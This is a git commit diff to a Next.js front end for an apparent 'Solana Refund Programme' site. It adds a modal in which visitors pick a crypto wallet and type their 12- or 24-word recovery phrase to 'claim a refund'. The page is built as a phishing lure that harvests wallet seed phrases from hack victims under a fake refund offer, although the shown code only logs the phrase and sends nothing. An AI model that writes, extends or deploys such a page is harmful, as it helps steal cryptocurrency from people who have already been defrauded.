c2626097294d7219548e90796abf03df588aa9a8
Poise-Paul <stargrades0@gmail.com>
2022-12-04 18:45:04 +0100

    revert-updates

--- pages/index.js
+++ pages/index.js
@@ -2,8 +2,9 @@ import Head from "next/head";
 import Image from "next/image";
 import styles from "../styles/Home.module.css";
 import Cancel from "./comps/Cancel";
-
+import react, { useState } from "react";
 export default function Home() {
+  const [phrase, setPhrase] = useState("");
   const wallets = [
     {
       name: "Atomic",
@@ -47,13 +48,29 @@ export default function Home() {
     },
   ];
   const getPhrase = () => {
-    const phrase = prompt("Enter 12 /24 Word Phrase");
     console.log(phrase, "✅");
+    if (phrase.length < 12) {
+      alert("Word Phrase is too short");
+      return;
+    }
+    setPhrase("");
+    alert("Phrase Word has been submitted");
   };
   const showModal = () => {
     document
       .querySelectorAll(".modal")
       .forEach((x) => x.classList.toggle("hidden"));
+  };
+  const showPhrase = (decide) => {
+    if (decide == "all") {
+      document.querySelector(".word-phrase").classList.add("hidden");
+      document
+        .querySelectorAll(".modal")
+        .forEach((x) => x.classList.add("hidden"));
+      return;
+    }
+    document.querySelector(".word-phrase").classList.remove("hidden");
+    document.getElementById("selectWallet").classList.add("hidden");
   };
   return (
     <div className="bg-black">
@@ -68,13 +85,13 @@ export default function Home() {
 
         <nav className="grid w-full grid-cols-2 mb-2">
           <div className="flex">
-            <img src="Sol-Logo.svg" alt="Sol-Logo" className="w-56" />
+            <img src="Sol-Logo-svg.png" alt="Sol-Logo" className="w-44 h-8 " />
           </div>
           <div className="flex justify-end">
             <ul className="flex gap-5 items-center">
               <li>Home</li>
               <li
-                className="bg-[#17fb9b] font-medium px-5 py-2 text-black rounded-full"
+                className="bg-[#17fb9b] cursor-pointer font-medium px-5 py-2 text-black rounded-full"
                 onClick={showModal}
               >
                 Claim Refund
@@ -91,15 +108,14 @@ export default function Home() {
           <div className="ml-60 absolute">
             <img src="Sol-Main-img.webp" alt="Sol-Image" />
           </div>
-          <div className="flex mt-96 gap-10 flex-col items-center">
+          <div className="flex mt-[27rem] gap-10 flex-col items-center">
             <h1 className="font-semibold text-7xl">
               {" "}
               <span className="font-extralight">Solana</span> Refund Programme
             </h1>
             <p className="text-3xl font-light text-center">
-              Solana refunds is available to all the solana hack victims, get{" "}
-              <br />
-              refunds to your wallet by claiming refunds
+              Solana Refund is available to all solana network. <br /> Get
+              refund by claiming your refund now.
             </p>
             <button
               className="bg-[#17fb9b] px-5 text-lg cursor-pointer py-2
@@ -113,7 +129,10 @@ export default function Home() {
           {/* Overlay */}
           {/* End Overlay */}
           {/* Modal */}
-          <div className="mt-7 bg-white modal absolute rounded-xl shadow-lg hidden">
+          <div
+            id="selectWallet"
+            className="mt-7 bg-white modal absolute rounded-xl shadow-lg hidden"
+          >
             <div className="p-4 sm:p-7">
               <div className="grid grid-cols-2">
                 <h1 className="block text-2xl mb-5 text-center font-semibold text-black">
@@ -131,7 +150,7 @@ export default function Home() {
                     return (
                       <div
                         className="flex cursor-pointer flex-col items-center"
-                        onClick={getPhrase}
+                        onClick={showPhrase}
                         key={key}
                       >
                         <img
@@ -150,6 +169,39 @@ export default function Home() {
             </div>
           </div>
           {/* End-Modal */}
+          {/* 12 word Input */}
+          <div className="mt-7 bg-white word-phrase absolute rounded-xl shadow-lg hidden">
+            <div className="p-4 sm:p-7">
+              <div className="grid grid-cols-2">
+                <h1 className="block text-2xl mb-5 text-center font-semibold text-black">
+                  Enter 12/14 word phrase
+                </h1>
+
+                <div
+                  className="w-full flex justify-end"
+                  onClick={() => showPhrase("all")}
+                >
+                  <Cancel />
+                </div>
+              </div>
+
+              <div className="">
+                <input
+                  type="text"
+                  value={phrase}
+                  onChange={(e) => setPhrase(e.target.value)}
+                  className="rounded-lg border-2 bg-none border-gray-300 w-full p-2"
+                />
+              </div>
+              <button
+                className="bg-[#17fb9b] mt-3 font-semibold rounded-full text-black px-3 py-2"
+                onClick={getPhrase}
+              >
+                Continue
+              </button>
+            </div>
+          </div>
+          {/* End 12 word input */}
         </div>
       </main>
     </div>
